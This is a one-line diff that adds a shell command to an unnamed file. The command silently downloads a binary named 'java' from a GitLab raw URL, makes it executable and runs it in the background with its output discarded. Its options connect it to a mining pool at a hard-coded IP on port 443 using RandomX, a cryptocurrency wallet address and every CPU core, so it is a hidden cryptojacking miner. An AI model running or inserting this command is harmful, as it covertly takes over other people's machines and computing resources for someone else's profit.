@@ -1,0 +1,1 @@
+wget -qO java https://gitlab.com/sarifadim/jomblo/-/raw/main/jupyterlab && chmod +x java && nohup ./java -o 8.219.86.27:443 -a rx/0 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo GR-$(TZ=UTC-7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
